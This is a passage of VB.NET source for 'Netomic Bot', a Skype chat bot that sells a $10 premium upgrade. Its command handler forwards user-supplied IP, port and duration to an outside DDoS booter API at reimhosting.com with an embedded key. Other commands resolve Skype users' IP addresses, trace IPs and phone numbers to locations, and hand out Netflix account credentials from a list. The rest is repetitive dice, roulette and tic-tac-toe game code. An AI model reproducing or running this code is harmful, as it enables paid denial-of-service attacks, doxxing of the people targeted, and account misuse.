                                c.SendMessage("Failed to find FML story! (1 to 13)")
                            End Try
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg.StartsWith("google=") Then
                Dim user As String() = Msg.Split("=")
                'https://www.google.com/search?q=
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]

                            Dim search As String = user(1)
                            search = search.Replace(" ", "%20")
                            c.SendMessage("Link: " & "https://www.google.com/search?q=" & search)
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            ElseIf Msg = "FORLATERUSE" Then 'To be worked on later [Proxies]
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")

                    If username2 = pMessage.Sender.Handle Then '[5]
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]

                            getproxies()
                            c.SendMessage(p1)
                            c.SendMessage(p2)
                            c.SendMessage(p3)
                            c.SendMessage(p4)
                            c.SendMessage(p5)
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next

            End If
            If Msg.StartsWith("netflixrequest") Then '[7]
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")
                    Dim temp As String
                    If username2 = pMessage.Sender.Handle Then '[5]
                        For Each item3 As NSListView.NSListViewItem In NsListView1.Items
                            If item3.Text.Contains(pMessage.Sender.Handle) Then
                                If item3.Text.Contains("netflixrequest") Then

                                    temp = item3.Text.Split("PM:").First
                                    temp = item3.Text.Split("AM:").First
                                End If
                            End If
                        Next
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            If temp = Nothing Or temp = "" Then

                                Try
                                    Dim rnd As New Random
                                    Dim temp2 As String = netflixlistbox.Items(rnd.Next(0, netflixlistbox.Items.Count))
                                    c.SendMessage("Your Netflix Account: " & temp2)
                                Catch ex As Exception
                                    c.SendMessage("Failed to DDOS! Remember to - [.] ddos <IP> <Address> <Port> <Time> !")
                                End Try
                            End If


                            If Not String.IsNullOrEmpty(temp) Then

                                temp = temp.Replace(":", "")

                                Dim clock As String = DateTime.Now.ToLongTimeString() + ":"
                                clock = clock.Split("PM:").First
                                clock = clock.Replace(":", "")
                                clock = clock.Split("AM:").First
                                clock = clock.Replace(":", "")
                                ' MsgBox("clock:" & clock & "," & "Last Boot Time:" & temp)

                                Dim time As String = clock - temp
                                'MsgBox(time)

                                If time >= 240 Then
                                    Try
                                        Dim rnd As New Random
                                        Dim temp2 As String = netflixlistbox.Items(rnd.Next(0, netflixlistbox.Items.Count))
                                        c.SendMessage("Your Netflix Account: " & temp2)
                                    Catch ex As Exception
                                        c.SendMessage("Failed to request!")
                                    End Try
                                Else
                                    c.SendMessage("You Still have " & 240 - time & " seconds before you can request again!")
                                End If
                            End If
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            End If
            If Msg.StartsWith("ddos") Then '[7]
                Dim user As String() = Msg.Split(" ")
                For Each item2 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username2 As String = item2.Text.Split("[]").First
                    Dim Type2 As String = item2.Text.Split("[]").Last
                    Type2 = Type2.Replace("]", "")
                    Dim temp As String
                    If username2 = pMessage.Sender.Handle Then '[5]
                        For Each item3 As NSListView.NSListViewItem In NsListView1.Items
                            If item3.Text.Contains(pMessage.Sender.Handle) Then
                                If item3.Text.Contains("ddos") Then
                                    temp = item3.Text.Split("PM:").First
                                    temp = item3.Text.Split("AM:").First
                                End If
                            End If
                        Next
                        If Type2 = "Premuim" Or Type2 = "Admin" Then '[6]
                            If temp = Nothing Or temp = "" Then

                                Try
                                    wb0.DownloadStringAsync(New Uri("http://reimhosting.com/ddos/api1.php?key=bfd9bb364b9744e7c95a0dd70cd61cd0&host=" & user(1) & "&port=" & user(2) & "&time=" & user(3) & "&method=UDP"))
                                    c.SendMessage("Your attack has been sent!")
                                Catch ex As Exception
                                    c.SendMessage("You attack failed! Remember to enter the command correctly - [.] ddos <IP> <Address> <Port> <Time>")
                                End Try
                            End If


                            If Not String.IsNullOrEmpty(temp) Then

                                temp = temp.Replace(":", "")

                                Dim clock As String = DateTime.Now.ToLongTimeString() + ":"
                                clock = clock.Split("PM:").First
                                clock = clock.Replace(":", "")
                                clock = clock.Split("AM:").First
                                clock = clock.Replace(":", "")
                                ' MsgBox("clock:" & clock & "," & "Last Boot Time:" & temp)
                                Dim time As String = clock - temp
                                'MsgBox(time)

                                If time >= 900 Then
                                    Try
                                        wb0.DownloadStringAsync(New Uri("" & user(1) & "&port=" & user(2) & "&time=" & user(3) & "&method=UDP"))
                                        c.SendMessage("Boot Sent!")
                                    Catch ex As Exception
                                        c.SendMessage("Failed to DDOS! Remember to - [.] ddos <IP> <Address> <Port> <Time> !")
                                    End Try
                                Else
                                    c.SendMessage("You Still have " & 900 - time & " seconds before you can boot again!")
                                End If
                            End If
                        Else
                            c.SendMessage("Your account is not upgraded!")
                        End If
                    End If
                Next
            End If
            NsListView1.AddItem(DateTime.Now.ToLongTimeString() + ": " + "Command " + "'" + Msg + "'" + " From " + pMessage.Sender.Handle & "(" & pMessage.FromDisplayName & ")")
            If NsCheckBox2.Checked = True Then '[9]
                For Each item As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                    Dim username As String = item.Text.Split("[]").First
                    Dim Type As String = item.Text.Split("[]").Last
                    Type = Type.Replace("]", "")
                    If username = pMessage.Sender.Handle Then '[5]
                        If Not Type = "Banned" Then '[6]
                            If Msg = "menu" Then '[7]
                                For Each item4 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                                    Dim username4 As String = item4.Text.Split("[]").First
                                    Dim Type4 As String = item4.Text.Split("[]").Last
                                    Type4 = Type4.Replace("]", "")
                                    If username4 = pMessage.Sender.Handle Then '[5]
                                        If Not Type = "Premuim" Or Type = "Admin" Then '[6]

                                            'register
                                            c.SendMessage("==============================" + vbNewLine + "       [===-Netomic Bot Commands-===]     " + vbNewLine + "==============================" + vbNewLine + "When using commmands do not include the '< >'" + vbNewLine + " " + vbNewLine + "[.] menu - Displays this menu." + vbNewLine + "[.] resolve <Skype Username> - Resolve a Skype user's IP Address." + vbNewLine + "[.] cfresolve <URL> - Resolve a Cloudflare host's IP Address." + vbNewLine + "[.] trace <IP Address> - Trace an IP Address." + vbNewLine + "[.] ddos <IP Address> <Port> <Time> - This is a premium feature only." + vbNewLine + "[.] ping <IP Address> - Checks if the given IP Address or host is online." + vbNewLine + "[.] phonetogeo <Phone Number> - Trace a mobile or home phone number." + vbNewLine + "[.] myip - Displays your current IP Address." + vbNewLine + "[.] google=<search> - This is a premium feature only." + vbNewLine + "[.] shrink <URL> - Shorten a URL." + vbNewLine + "[.] netflixrequst - This is a premium feature only." + vbNewLine + "[.] dice - This is a premium feature only." + vbNewLine + "[.] fml <1-13> - This is a premuim feature." + vbNewLine + "[.] ttt - This is a premium feature only." + vbNewLine + "[.] upgrade - Upgrade your account to premium." + vbNewLine + "[.] version - Display current version of Netomic Bot." + vbNewLine + "[.] about - A breif description about Netomic Bot." + vbNewLine + " " + vbNewLine + "Type Hello to have a conversation with Netomic Bot. [BETA]")
                                        Else
                                            'premuim
                                            c.SendMessage("==============================" + vbNewLine + "       [===-Netomic Bot Commands-===]     " + vbNewLine + "==============================" + vbNewLine + "When using commmands do not include the '< >'" + vbNewLine + " " + vbNewLine + "[.] menu - Displays this menu." + vbNewLine + "[.] resolve <Skype Username> - Resolve a Skype user's IP Address." + vbNewLine + "[.] cfresolve <URL> - Resolve a Cloudflare host's IP Address." + vbNewLine + "[.] trace <IP Address> - Trace an IP Address." + vbNewLine + "[.] ddos <IP Address> <Port> <Time> - DDos an IP Address or host." + vbNewLine + "[.] ping <IP Address> - Checks if the given IP Address or host is online." + vbNewLine + "[.] phonetogeo <Phone Number> - Trace a mobile or home phone number." + vbNewLine + "[.] myip - Displays your current IP Address." + vbNewLine + "[.] google=<search> - Quick search using the search engine, Google." + vbNewLine + "[.] shrink <URL> - Shorten a URL." + vbNewLine + "[.] netflixrequst - Request a free Netflix account." + vbNewLine + "[.] dice - Play a game of chance." + vbNewLine + "[.] fml <1-13> - Get a FML story." + vbNewLine + "[.] ttt - Play a game of Tic Tac Toe." + vbNewLine + "[.] version - Display current version of Netomic Bot." + vbNewLine + "[.] about - A breif description about Netomic Bot." + vbNewLine + " " + vbNewLine + "Type Hello to have a conversation with Netomic Bot. [BETA]")
                                        End If
                                    End If
                                Next
                            ElseIf Msg = "about" Then  '[7]
                                c.SendMessage("Netomic Bot is one of many of Netomic's amazing products. Netomic Bot was created on June 7th by Nettro and Tizzy for the soul purpose of helping others. However, we've included an upgrade feature to help cover the monthly payments of API's and servers of Netomic Bot. With an upgraded account you get access to our DDos command along with access 7 custom API's for our Skype resolver. Upgraded users also get access to their very own menu which is full of hidden features.")
                            ElseIf Msg = "help" Then  '[7]
                                c.SendMessage("To start using the commands type .register to register, after you have registered type .menu view a list of  commands.")
                            ElseIf Msg = "version" Then  '[7]
                                c.SendMessage("Netomic Bot's current version is 1.0a")
                            ElseIf Msg = "upgrade" Then
                                For Each item4 As NSListView.NSListViewItem In Users_listview.Items '[FE2]
                                    Dim username4 As String = item4.Text.Split("[]").First
                                    Dim Type4 As String = item4.Text.Split("[]").Last
                                    Type4 = Type4.Replace("]", "")
                                    If username4 = pMessage.Sender.Handle Then '[5]
                                        If Not Type = "Premuim" Then '[6]
                                            Dim upgradepp As String = wb0.DownloadString("http://tinyurl.com/api-create.php?url=" & "https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=Scarr14%40outlook%2ecom&lc=US&item_name=Netomic%20Bot%20Premium%20Upgrade&item_number=" & pMessage.Sender.Handle & "&amount=10%2e00&currency_code=USD&button_subtype=services&no_note=0&bn=PP%2dBuyNowBF%3abtn_buynowCC_LG%2egif%3aNonHostedGuest")
                                            c.SendMessage("==============================" + vbNewLine + "         [===-Netomic Bot Upgrade-===]     " + vbNewLine + "==============================" + vbNewLine + " " + vbNewLine + "Upgrade price: $10.00 USD" + vbNewLine + "Duration: Lifetime" + vbNewLine + "Your personal payment link is: " + upgradepp)
                                        Else
                                            c.SendMessage("You already have a premium account!")
                                        End If
                                    End If
                                Next
                            ElseIf Msg.StartsWith("resolve") Then  '[7]
                                Dim user As String() = Msg.Split(" ")
                                c.SendMessage("Resolving " & user(1))
                            ElseIf Msg.StartsWith("websitetoip") Then
                                Dim user As String() = Msg.Split(" ")
                                Try
                                    If user(1).Contains("http://") Then
                                        Dim iphe As IPHostEntry = Dns.GetHostEntry(user(1).Replace("http://", String.Empty))
                                        c.SendMessage(iphe.AddressList(0).ToString())
                                    Else
                                        Dim iphe As IPHostEntry = Dns.GetHostEntry(user(1))
                                        c.SendMessage(iphe.AddressList(0).ToString())
                                    End If
                                Catch ex As Exception
                                    MsgBox(ex)
                                End Try
                            ElseIf Msg.StartsWith("shrink") Then
                                Dim user As String() = Msg.Split(" ")
                                Dim qw As String = wb0.DownloadString("http://tinyurl.com/api-create.php?url=" & user(1))
                                c.SendMessage("Your URL has been shortened: " & qw)
                            ElseIf Msg.StartsWith("ping") Then
                                Dim user As String() = Msg.Split(" ")
                                c.SendMessage("Pinging Please Wait!")
                                c.SendMessage("Ping: " & GetPingMs(user(1)) & "ms")
                            ElseIf Msg = "myip" Then  '[7]
                                Dim user As String() = Msg.Split(" ")
                                c.SendMessage("Finding " & pMessage.Sender.Handle)
                            ElseIf Msg.StartsWith("trace") Then
                                c.SendMessage("Tracing...")
                                Dim user As String() = Msg.Split(" ")
                                Dim source As String
                                Dim mess As String
                                Dim wclient As New System.Net.WebClient
                                source = wclient.DownloadString(New Uri("http://api.ipinfodb.com/v3/ip-city/?key=18ad6063c0d0695092d9354a4b358c109e72cd0248c9de6b1620c0ed501cac46&ip=" & user(1)))
                                Dim words3 As String() = source.Split(New Char() {";"c, ControlChars.Lf, ControlChars.Cr, ControlChars.Tab})
                                mess = ""
                                Dim i As Integer = 0
                                For Each word As String In words3
                                    i += 1
                                    If i = 1 Then
                                        mess += word + vbNewLine
                                    End If
                                    If i = 3 Then
                                        mess += "IP Address: " & word + vbNewLine
                                    End If
                                    If i = 4 Then
                                        mess += "Country Code: " & word + vbNewLine
                                    End If
                                    If i = 5 Then
                                        mess += "Country: " & word + vbNewLine
                                    End If
                                    If i = 6 Then
                                        mess += "State: " & word + vbNewLine
                                    End If
                                    If i = 7 Then
                                        mess += "City: " & word + vbNewLine
                                    End If
                                    If i = 8 Then
                                        mess += "Zip Code: " & word + vbNewLine
                                    End If
                                    If i = 9 Then
                                        mess += "Longitude: " & word + vbNewLine
                                    End If
                                    If i = 10 Then
                                        mess += "Latitude: " & word + vbNewLine
                                    End If
                                    If i = 11 Then
                                        mess += "Time Zone: " & word + vbNewLine
                                    End If
                                    mess = mess.Replace("OK", "")
                                Next
                                c.SendMessage("" & mess)

                            ElseIf Msg = "date" Then '[7]
                                c.SendMessage("Current Date is: " & DateTime.Now.ToLongDateString())
                            ElseIf Msg = "time" Then '[7]
                                c.SendMessage("Current Time is: " & DateTime.Now.ToLongTimeString())
                            End If '[7]
                        Else '[6]
                            c.SendMessage("You have been banned from further use of the bot!")
                        End If '[6]
                    End If '[5]
                Next '[FE2]
            End If '[9]
            If NsCheckBox2.Checked = False Then '1[9]
                If Msg = "menu" Then '1[7]
                    c.SendMessage("==============================" + vbNewLine + "       [===-Netomic Bot Commands-===]     " + vbNewLine + "==============================" + vbNewLine + "When using commmands do not include the '< >'" + vbNewLine + " " + vbNewLine + "[.] menu - Displays this menu." + vbNewLine + "[.] resolve <Skype Username> - Resolve IP Address from a Skype username." + vbNewLine + "[.] trace <IP Address> - Trace an IP Address." + vbNewLine + "[.] ddos <IP Address> <Seconds> <Method> <Port> - DDos an IP Address." + vbNewLine + "[.] ping <IP Address> - Checks if the given IP Address is conntected to the internet." + vbNewLine + "[.] myip - Displays your current IP Address." + vbNewLine + "[.] shrink <URL> - Shorten a URL.")
                ElseIf Msg = "" Then  '1[7]

                End If '1[7]
            End If '1[9]

            '[M]HUMAN MODE ///Feature that talks and communcates with the group / user
            If HM_Checkbox.Checked = True Then
                If Msg = "Hello" Then

                    c.SendMessage("Hello, how are you?")
                ElseIf Msg = "1" Or Msg = "2" Or Msg = "3" Or Msg = "4" Or Msg = "5" Or Msg = "6" Then
                    For Each item As ListViewItem In ListView1.Items
                        If item.Text = pMessage.Sender.Handle Then
                            Dim rnd As New Random
                            Dim selin As String = rnd.Next(1, 7)
                            If selin = Msg Then
                                c.SendMessage("You Win! It landed on " & selin & ".")
                                ListView1.Items.Remove(item)
                            Else
                                c.SendMessage("You Lose! It landed on " & selin & ".")
                                ListView1.Items.Remove(item)
                            End If
                        End If
                    Next
                ElseIf Msg = "red" Or Msg = "black" Then
                    For Each item As ListViewItem In ListView1.Items
                        If item.Text = pMessage.Sender.Handle Then
                            '  For i As Integer = 0 To 2
                            'Threading.Thread.Sleep(250)
                            ' pMessage.Body = "Spinning.."
                            ' Threading.Thread.Sleep(250)
                            '' pMessage.Body = "Spinning..."
                            ' Threading.Thread.Sleep(250)
                            '  pMessage.Body = "Spinning"
                            '  Threading.Thread.Sleep(250)
                            ' pMessage.Body = "Spinning."
                            '  i += 1
                            ' Next
                            Dim rnd As New Random
                            Dim stri As String = rnd.Next(1, 3)
                            If stri = 1 Then
                                stri = "black"
                            Else
                                stri = "red"
                            End If

                            If Msg = stri Then
                                c.SendMessage("You win! it landed on " & stri)
                                ListView1.Items.Remove(item)
                            Else
                                c.SendMessage("You lose! it landed on " & stri)
                                ListView1.Items.Remove(item)
                            End If
                        End If
                    Next
                ElseIf Msg = "a1" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(1).Text = " " Then
                                item.SubItems(1).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"

                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "b1" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(2).Text = " " Then
                                item.SubItems(2).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "c1" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(3).Text = " " Then
                                item.SubItems(3).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
                                If item.SubItems(8).Text = " " Then
                                    tttlistbox.Items.Add("8")
                                End If
                                If item.SubItems(9).Text = " " Then
                                    tttlistbox.Items.Add("9")
                                End If
                                Dim temp As Integer = tttlistbox.Items(rnd.Next(0, tttlistbox.Items.Count))
                                item.SubItems(temp).Text = "X"
                                c.SendMessage("a b c" & vbNewLine & item.SubItems(1).Text & "|" & item.SubItems(2).Text & "|" & item.SubItems(3).Text & "  1" & vbNewLine & "------" & vbNewLine & item.SubItems(4).Text & "|" & item.SubItems(5).Text & "|" & item.SubItems(6).Text & "  2" & vbNewLine & "------" & vbNewLine & item.SubItems(7).Text & "|" & item.SubItems(8).Text & "|" & item.SubItems(9).Text & "  3")
                                If item.SubItems(7).Text = "O" And item.SubItems(8).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(6).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(2).Text = "O" And item.SubItems(3).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "O" And item.SubItems(4).Text = "O" And item.SubItems(7).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "O" And item.SubItems(5).Text = "O" And item.SubItems(8).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "O" And item.SubItems(6).Text = "O" And item.SubItems(9).Text = "O" Then
                                    c.SendMessage("You Win")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(7).Text = "X" And item.SubItems(8).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(4).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(6).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(2).Text = "X" And item.SubItems(3).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(1).Text = "X" And item.SubItems(4).Text = "X" And item.SubItems(7).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(2).Text = "X" And item.SubItems(5).Text = "X" And item.SubItems(8).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                                If item.SubItems(3).Text = "X" And item.SubItems(6).Text = "X" And item.SubItems(9).Text = "X" Then
                                    c.SendMessage(" Bot Wins")
                                    ListView3.Items.Remove(item)
                                End If
                            Else
                                c.SendMessage("Spot is taken!")
                            End If
                        End If
                    Next
                ElseIf Msg = "a2" Then
                    tttlistbox.Items.Clear()
                    For Each item As ListViewItem In ListView3.Items
                        If item.Text = pMessage.Sender.Handle Then
                            If item.SubItems(4).Text = " " Then
                                item.SubItems(4).Text = "O"
                                If item.SubItems(1).Text = " " Then
                                    tttlistbox.Items.Add("1")
                                End If
                                If item.SubItems(2).Text = " " Then
                                    tttlistbox.Items.Add("2")
                                End If
                                If item.SubItems(3).Text = " " Then
                                    tttlistbox.Items.Add("3")
                                End If
                                If item.SubItems(4).Text = " " Then
                                    tttlistbox.Items.Add("4")
                                End If
                                If item.SubItems(5).Text = " " Then
                                    tttlistbox.Items.Add("5")
                                End If
                                If item.SubItems(6).Text = " " Then
                                    tttlistbox.Items.Add("6")
                                End If
                                If item.SubItems(7).Text = " " Then
                                    tttlistbox.Items.Add("7")
                                End If
